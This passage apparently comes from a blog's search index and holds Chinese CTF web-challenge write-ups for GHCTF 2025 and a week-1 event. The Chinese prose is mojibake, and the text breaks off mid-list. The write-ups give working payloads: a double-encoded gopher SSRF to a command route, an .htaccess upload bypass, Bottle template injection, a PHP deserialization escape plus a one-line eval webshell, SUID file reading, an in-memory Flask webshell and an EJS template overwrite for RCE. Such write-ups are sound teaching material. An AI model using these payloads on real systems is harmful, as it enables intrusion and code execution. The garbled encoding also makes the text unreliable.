å¼±å£ä»¤ç™»å½•\nadmin/admin123\nç™»è¿›å»ä¹‹åå‘ç°æœ‰ä¸ªä»»æ„æ–‡ä»¶è¯»å–\næˆ‘è¿™é‡Œç›´æ¥æ‰“çš„éé¢„æœŸ\nç›´æ¥è¯»ç¯å¢ƒå˜é‡ /proc/1/environï¼Œå°±èƒ½æ‹¿åˆ°flag\né¢„æœŸè§£åº”è¯¥æ˜¯è¯»æºç ç„¶åè¯»ç¯å¢ƒå˜é‡æ‹¿keyå’Œivæ‰“pickleçš„\nPayload:\n1POST filename=/proc/1/environ Goph3rrr /app.pyå¯ä»¥æ‹¿åˆ°æºç \n1@app.route(\u0026#39;/Manage\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 2def cmd(): 3 if request.remote_addr != \u0026#34;127.0.0.1\u0026#34;: 4 return \u0026#34;Forbidden!!!\u0026#34; 5 if request.method == \u0026#34;GET\u0026#34;: 6 return \u0026#34;Allowed!!!\u0026#34; 7 if request.method == \u0026#34;POST\u0026#34;: 8 return os.popen(request.form.get(\u0026#34;cmd\u0026#34;)).read() 9 10@app.route(\u0026#39;/Gopher\u0026#39;) 11def visit(): 12 url = request.args.get(\u0026#39;url\u0026#39;) 13 if url is None: 14 return \u0026#34;No url provided :)\u0026#34; 15 url = urlparse(url) 16 realIpAddress = socket.gethostbyname(url.hostname) 17 if url.scheme == \u0026#34;file\u0026#34; or realIpAddress in BlackList: 18 return \u0026#34;No (â‰§âˆ‡â‰¦)\u0026#34; 19 result = subprocess.run([\u0026#34;curl\u0026#34;, \u0026#34;-L\u0026#34;, urlunparse(url)], capture_output=True, text=True) 20 return result.stdout ä¸»è¦æ˜¯è¿™ä¸¤ä¸ªè·¯ç”±ï¼Œä¸€ä¸ªè¦æœ¬åœ°è®¿é—®ï¼Œå¦ä¸€ä¸ªå¯ä»¥æ‰“ssrf\nå…¶å®è¿™é¢˜å°±æ˜¯0xgame2024çš„ä¸€é“ssrfï¼Œå‡ ä¹æ²¡æ”¹\npayloadæ‹¿æ¥æ”¹ä¸€ä¸‹ç›´æ¥æ‰“å°±è¡Œäº†\npayloadå¦‚ä¸‹\n1/Gopher?url=gopher://0.0.0.0:8000/_payload 2POST /Manage HTTP/1.1 3Host: 127.0.0.1:8000 4Content-Type: application/x-www-form-urlencoded 5Content-Length: 7 6 7cmd=env æŠŠä¸Šé¢è¿™ä¸ªurlç¼–ç ä¸¤æ¬¡ä¹‹åæ”¾åˆ°payloadé‚£é‡Œ\næœ€ç»ˆpayload\n1/Gopher?url=gopher://0.0.0.0:8000/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%34%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%37%25%30%61%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%35%25%36%65%25%37%36 ç¯å¢ƒå˜é‡é‡Œé¢æœ‰flag\nUPUPUP æ–‡ä»¶ä¸Šä¼ ï¼Œfuzzäº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰phpæ˜¯æ²¡ä»€ä¹ˆå¯èƒ½ç»•è¿‡çš„äº†\næƒ³åˆ°æ‰“.htaccess\nä½†æ˜¯åº”è¯¥æœ‰exif_imagetype()ï¼Œæ­£å¸¸æ¥è¯´ç”¨GIF89aç»•è¿‡.htaccessä¼šæŠ¥é”™\nå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•ç»•ä¸€ä¸‹\nPayload\n1#define width 66 2#define height 66 3\u0026lt;FilesMatch \u0026#34;1.jpg\u0026#34;\u0026gt; 4 SetHandler application/x-httpd-php 5\u0026lt;/FilesMatch\u0026gt; Message in a Bottle bottleçš„æ¨¡æ¿æ³¨å…¥\nè¿™é¢˜wafæ‰äº†{}\nhttps://github.com/myzhan/bottle-doc-zh-cn/blob/master/docs/stpl.rst\nçœ‹äº†ä¸€ä¸‹æ–‡æ¡£ï¼Œå‘ç°å…¶å®ä¸ç”¨{}\nPayload\n1\u0026lt;h\u0026gt; 2 %import os;os.system(\u0026#39;whoami\u0026#39;) 3 %end 4\u0026lt;/h\u0026gt; é¢˜ç›®æ²¡å›æ˜¾ä½†æ˜¯å‡ºç½‘ï¼Œæˆ‘è¿™é‡Œç›´æ¥åå¼¹shellè¯»flagäº†\nEscapeï¼ æ¼æ´ç‚¹\n1$userData = checkSignedCookie(); 2if ($userData) { 3 #echo $userData; 4 $user=unserialize($userData); 5 #var_dump($user); 6 if($user-\u0026gt;isadmin){ 7 $tmp=file_get_contents(\u0026#34;tmp/admin.html\u0026#34;); 8 9 echo $tmp; 10 11 if($_POST[\u0026#39;txt\u0026#39;]) { 12 $content = \u0026#39;\u0026lt;?php exit; ?\u0026gt;\u0026#39;; 13 $content .= $_POST[\u0026#39;txt\u0026#39;]; 14 file_put_contents($_POST[\u0026#39;filename\u0026#39;], $content); 15 } 16 } 17 else{ 18 $tmp=file_get_contents(\u0026#34;tmp/admin.html\u0026#34;); 19 echo $tmp; 20 if($_POST[\u0026#39;txt\u0026#39;]||$_POST[\u0026#39;filename\u0026#39;]){ 21 echo \u0026#34;\u0026lt;h1\u0026gt;æƒé™ä¸è¶³ï¼Œå†™å…¥å¤±è´¥\u0026lt;h1\u0026gt;\u0026#34;; 22} ç»å…¸çš„æ­»äº¡æ‚ç³…ç»•è¿‡\nä½†æ˜¯å‰ææ˜¯è¦isadminä¸º1\nçœ‹åˆ°ååºåˆ—åŒ–ï¼Œå†åŠ ä¸Šé¢˜ç›®æš—ç¤ºä¸wafæœ‰å…³ï¼Œè‡ªç„¶å°±æƒ³åˆ°äº†ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\nWaf\n1\u0026lt;?php 2 3function waf($c) 4{ 5 $lists=[\u0026#34;flag\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\\\\\u0026#34;,\u0026#34;sleep\u0026#34;,\u0026#34;and\u0026#34;,\u0026#34;||\u0026#34;,\u0026#34;\u0026amp;\u0026amp;\u0026#34;,\u0026#34;select\u0026#34;,\u0026#34;union\u0026#34;]; 6 foreach($lists as $list){ 7 $c=str_replace($list,\u0026#34;error\u0026#34;,$c); 8 } 9 #echo $c; 10 return $c; 11} æˆ‘è¿™é‡Œæ˜¯å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åæ‹¿åˆ°cookieä¹‹åè§£base64æ‹¿åˆ°åºåˆ—åŒ–åçš„æ•°æ®\n1function setSignedCookie($serializedData, $cookieName = \u0026#39;user_token\u0026#39;, $secretKey = \u0026#39;fake_secretKey\u0026#39;) { 2 $signature = hash_hmac(\u0026#39;sha256\u0026#39;, $serializedData, $secretKey); 3 4 $token = base64_encode($serializedData . \u0026#39;|\u0026#39; . $signature); 5 6 setcookie($cookieName, $token, time() + 3600, \u0026#34;/\u0026#34;); // è®¾ç½®æœ‰æ•ˆæœŸä¸º1å°æ—¶ 7} å¯ä»¥çœ‹åˆ°åºåˆ—åŒ–çš„æ•°æ®æ˜¯ç›´æ¥è¿›è¡Œbase64ç¼–ç çš„\næ„é€ å‡ºpayload\n1username flagandandandandandandandandandand\u0026#34;;s:7:\u0026#34;isadmin\u0026#34;;b:1;} 2password 123456 //éšæ„ é€ƒé€¸21ä¸ªå­—ç¬¦\nç™»å½•ä¹‹åå†™é©¬å°±è¡Œï¼Œä½†æ˜¯è¦ç»•ä¸€ä¸‹æ­»äº¡æ‚ç³…\nhttps://xz.aliyun.com/news/7758\npayload\n1php://filter/convert.base64-decode/resource=1.php 2aPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== 3//è¦è¡¥ä¸€ä¸ªa 4//\u0026lt;?php @eval($_POST[1]);?\u0026gt; GetShell é¢˜ç›®\n1\u0026lt;?php 2highlight_file(__FILE__); 3 4class ConfigLoader { 5 private $config; 6 7 public function __construct() { 8 $this-\u0026gt;config = [ 9 \u0026#39;debug\u0026#39; =\u0026gt; true, 10 \u0026#39;mode\u0026#39; =\u0026gt; \u0026#39;production\u0026#39;, 11 \u0026#39;log_level\u0026#39; =\u0026gt; \u0026#39;info\u0026#39;, 12 \u0026#39;max_input_length\u0026#39; =\u0026gt; 100, 13 \u0026#39;min_password_length\u0026#39; =\u0026gt; 8, 14 \u0026#39;allowed_actions\u0026#39; =\u0026gt; [\u0026#39;run\u0026#39;, \u0026#39;debug\u0026#39;, \u0026#39;generate\u0026#39;] 15 ]; 16 } 17 18 public function get($key) { 19 return $this-\u0026gt;config[$key] ?? null; 20 } 21} 22 23class Logger { 24 private $logLevel; 25 26 public function __construct($logLevel) { 27 $this-\u0026gt;logLevel = $logLevel; 28 } 29 30 public function log($message, $level = \u0026#39;info\u0026#39;) { 31 if ($level === $this-\u0026gt;logLevel) { 32 echo \u0026#34;[LOG] $message\\n\u0026#34;; 33 } 34 } 35} 36 37class UserManager { 38 private $users = []; 39 private $logger; 40 41 public function __construct($logger) { 42 $this-\u0026gt;logger = $logger; 43 } 44 45 public function addUser($username, $password) { 46 if (strlen($username) \u0026lt; 5) { 47 return \u0026#34;Username must be at least 5 characters\u0026#34;; 48 } 49 50 if (strlen($password) \u0026lt; 8) { 51 return \u0026#34;Password must be at least 8 characters\u0026#34;; 52 } 53 54 $this-\u0026gt;users[$username] = password_hash($password, PASSWORD_BCRYPT); 55 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;User $username added\u0026#34;); 56 return \u0026#34;User $username added\u0026#34;; 57 } 58 59 public function authenticate($username, $password) { 60 if (isset($this-\u0026gt;users[$username]) \u0026amp;\u0026amp; password_verify($password, $this-\u0026gt;users[$username])) { 61 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;User $username authenticated\u0026#34;); 62 return \u0026#34;User $username authenticated\u0026#34;; 63 } 64 return \u0026#34;Authentication failed\u0026#34;; 65 } 66} 67 68class StringUtils { 69 public static function sanitize($input) { 70 return htmlspecialchars($input, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;); 71 } 72 73 public static function generateRandomString($length = 10) { 74 return substr(str_shuffle(str_repeat($x = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;, ceil($length / strlen($x)))), 1, $length); 75 } 76} 77 78class InputValidator { 79 private $maxLength; 80 81 public function __construct($maxLength) { 82 $this-\u0026gt;maxLength = $maxLength; 83 } 84 85 public function validate($input) { 86 if (strlen($input) \u0026gt; $this-\u0026gt;maxLength) { 87 return \u0026#34;Input exceeds maximum length of {$this-\u0026gt;maxLength} characters\u0026#34;; 88 } 89 return true; 90 } 91} 92 93class CommandExecutor { 94 private $logger; 95 96 public function __construct($logger) { 97 $this-\u0026gt;logger = $logger; 98 } 99 100 public function execute($input) { 101 if (strpos($input, \u0026#39; \u0026#39;) !== false) { 102 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Invalid input: space detected\u0026#34;); 103 die(\u0026#39;No spaces allowed\u0026#39;); 104 } 105 106 @exec($input, $output); 107 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Result: $input\u0026#34;); 108 return implode(\u0026#34;\\n\u0026#34;, $output); 109 } 110} 111 112class ActionHandler { 113 private $config; 114 private $logger; 115 private $executor; 116 117 public function __construct($config, $logger) { 118 $this-\u0026gt;config = $config; 119 $this-\u0026gt;logger = $logger; 120 $this-\u0026gt;executor = new CommandExecutor($logger); 121 } 122 123 public function handle($action, $input) { 124 if (!in_array($action, $this-\u0026gt;config-\u0026gt;get(\u0026#39;allowed_actions\u0026#39;))) { 125 return \u0026#34;Invalid action\u0026#34;; 126 } 127 128 if ($action === \u0026#39;run\u0026#39;) { 129 $validator = new InputValidator($this-\u0026gt;config-\u0026gt;get(\u0026#39;max_input_length\u0026#39;)); 130 $validationResult = $validator-\u0026gt;validate($input); 131 if ($validationResult !== true) { 132 return $validationResult; 133 } 134 135 return $this-\u0026gt;executor-\u0026gt;execute($input); 136 } elseif ($action === \u0026#39;debug\u0026#39;) { 137 return \u0026#34;Debug mode enabled\u0026#34;; 138 } elseif ($action === \u0026#39;generate\u0026#39;) { 139 return \u0026#34;Random string: \u0026#34; . StringUtils::generateRandomString(15); 140 } 141 142 return \u0026#34;Unknown action\u0026#34;; 143 } 144} 145 146if (isset($_REQUEST[\u0026#39;action\u0026#39;])) { 147 $config = new ConfigLoader(); 148 $logger = new Logger($config-\u0026gt;get(\u0026#39;log_level\u0026#39;)); 149 150 $actionHandler = new ActionHandler($config, $logger); 151 $input = $_REQUEST[\u0026#39;input\u0026#39;] ?? \u0026#39;\u0026#39;; 152 echo $actionHandler-\u0026gt;handle($_REQUEST[\u0026#39;action\u0026#39;], $input); 153} else { 154 $config = new ConfigLoader(); 155 $logger = new Logger($config-\u0026gt;get(\u0026#39;log_level\u0026#39;)); 156 $userManager = new UserManager($logger); 157 158 if (isset($_POST[\u0026#39;register\u0026#39;])) { 159 $username = $_POST[\u0026#39;username\u0026#39;]; 160 $password = $_POST[\u0026#39;password\u0026#39;]; 161 162 echo $userManager-\u0026gt;addUser($username, $password); 163 } 164 165 if (isset($_POST[\u0026#39;login\u0026#39;])) { 166 $username = $_POST[\u0026#39;username\u0026#39;]; 167 $password = $_POST[\u0026#39;password\u0026#39;]; 168 169 echo $userManager-\u0026gt;authenticate($username, $password); 170 } 171 172 $logger-\u0026gt;log(\u0026#34;No action provided, running default logic\u0026#34;); 173} å®¡è®¡ä¸€ä¸‹\n1class CommandExecutor { 2 private $logger; 3 4 public function __construct($logger) { 5 $this-\u0026gt;logger = $logger; 6 } 7 8 public function execute($input) { 9 if (strpos($input, \u0026#39; \u0026#39;) !== false) { 10 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Invalid input: space detected\u0026#34;); 11 die(\u0026#39;No spaces allowed\u0026#39;); 12 } 13 14 @exec($input, $output); 15 $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Result: $input\u0026#34;); 16 return implode(\u0026#34;\\n\u0026#34;, $output); 17 } 18} æœ‰ä¸ªæ‰§è¡Œç±»\nå½“ä¼ å‚Actionä¸ºrunçš„æ—¶å€™å°±èƒ½èµ°è¿›å»äº†\nä¼ å‚inputè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œwafäº†ç©ºæ ¼\nå°è¯•è¯»flagå‘ç°è¯»ä¸äº†ï¼Œè¦ææƒ\nå°è¯•suidææƒ\n1find / -perm -u=s -type f 2\u0026gt;/dev/null 2çœ‹åˆ°æœ‰wcï¼Œè€Œä¸”wcå¯ä»¥è¯»æ–‡ä»¶ 3 4./wc --files0-from \u0026#34;/flag\u0026#34; Message in a Bottle plus bottleæ³¨å…¥çš„plusç‰ˆ\nhint:å¢åŠ äº†ä¸€ç‚¹wafå’ŒPythonè¯­æ³•é”™è¯¯æ£€æµ‹ï¼Œé¢˜ç›®ä¸å‡ºç½‘\nä¸€å¼€å§‹è¯•äº†å¾ˆä¹…å‘ç°ä¸€ç›´è¯´è¯­æ³•é”™è¯¯\nåé¢æƒ³äº†æƒ³å‘ç°è¿™ä¸ªè¯­æ³•è¿›è¡ŒPythonè¯­æ³•é”™è¯¯æ£€æµ‹ç¡®å®æ˜¯ä¼šæŠ¥é”™çš„\né‚£æˆ‘ä»¬ç”¨å¤šè¡Œæ³¨é‡Šæ‰ä¸å°±å¥½äº†ï¼Œå› ä¸ºé¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰“å†…å­˜é©¬\nå‚è€ƒ\nhttps://xz.aliyun.com/news/17049\nPayload\n1\u0026#34;\u0026#34;\u0026#34; 2% __import__(\u0026#39;sys\u0026#39;).modules[\u0026#39;__main__\u0026#39;].app.route(\u0026#34;/c\u0026#34;,\u0026#34;GET\u0026#34;,lambda :__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()) 3% end 4\u0026#34;\u0026#34;\u0026#34; è®¿é—®/cæ‹¿å›æ˜¾\n","permalink":"http://localhost:1313/post/ghctf_2025/","summary":"\u003cp\u003eæˆ˜é˜Ÿåï¼š\u003cstrong\u003eæˆ‘è¦æ‰“å¥¥æ–¯æ±€major\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæ¯”èµ›æ’åï¼š5\u003c/p\u003e\n\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"uploadssti\"\u003eupload?SSTI!\u003c/h3\u003e\n\u003cp\u003eè¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹å¹¶è¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œå­˜åœ¨ssti\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"img\" loading=\"lazy\" src=\"../assets/1742122180769-6.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæœ‰waf\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003econtains_dangerous_keywords\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_path\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e2\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003edangerous_keywords\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;os\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;subclasses\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;__builtins__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;__globals__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;flag\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e4\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;rb\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e5\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile_content\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e7\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ekeyword\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003edangerous_keywords\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e8\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ekeyword\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003efile_content\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e9\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# æ‰¾åˆ°å±é™©å…³é”®å­—ï¼Œè¿”å› True\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç®€å•ç»•ä¸€ä¸‹\u003c/p\u003e","title":"GHCTF-2025-Web-Writeup"},{"content":"Web week1 Level 24 Pacman æ‹¿åˆ°ç¯å¢ƒ\nä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\næŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\nå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\nhttps://tool.yuanrenxue.cn/decode_obfuscator\nåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\næ„Ÿè§‰æ˜¯æ …æ ï¼Œè§£å¯†æ‹¿åˆ°flag\nLevel 47 BandBomb æ–‡ä»¶ä¸Šä¼ \né™„ä»¶æœ‰æºç \n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;æ— æ•ˆçš„æ–‡ä»¶å\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;æ–‡ä»¶å¤„ç†é”™è¯¯\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`æœåŠ¡å™¨è¿è¡Œåœ¨ http://localhost:${port}`); 89}); è¿™é¢˜æœ‰ç‚¹åƒ24å›½èµ›çš„ezjs\næ–‡ç«  - å¯¹ejså¼•æ“æ¼æ´åŠå‡½æ•°ç‰¹æ€§çš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº\nå¯ä»¥çœ‹åˆ°åœ¨ /rename è·¯ç”±\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); è¿™ä¸ªè·¯ç”±ä¼šå°†uploadsç›®å½•ä¸­çš„æ–‡ä»¶é‡å‘½å\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·¯ç”±ï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šå¯¹ä»»æ„æ–‡ä»¶è¿›è¡Œç§»åŠ¨å’Œé‡å‘½å\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„çš„ejsåˆ°uploadsç›®å½•ï¼Œæ¥ç€é€šè¿‡/renameè·¯ç”±å°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ejsæ–‡ä»¶è¦†å†™æ‰/è·¯ç”±çš„æ¨¡æ¿æ–‡ä»¶mortis.ejså®ç°RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; å°†ejsä¸Šä¼ \nè¦†å†™åŸæ¥çš„ejs\nè®¿é—®/\nè¿™é¢˜flagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ\npayload:\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 